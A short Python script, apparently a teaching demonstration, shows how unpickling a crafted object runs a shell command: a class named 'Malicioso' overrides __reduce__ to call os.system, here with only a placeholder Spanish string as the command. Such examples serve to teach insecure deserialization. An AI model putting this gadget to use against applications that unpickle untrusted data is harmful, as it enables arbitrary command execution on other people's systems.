import os
import pickle

class Malicioso:
    def __reduce__(self):
        return (os.system, ("ejecuta el sistema",))
    
carga = pickle.dumps(Malicioso())
# print(carga)

pickle.loads(carga)
    
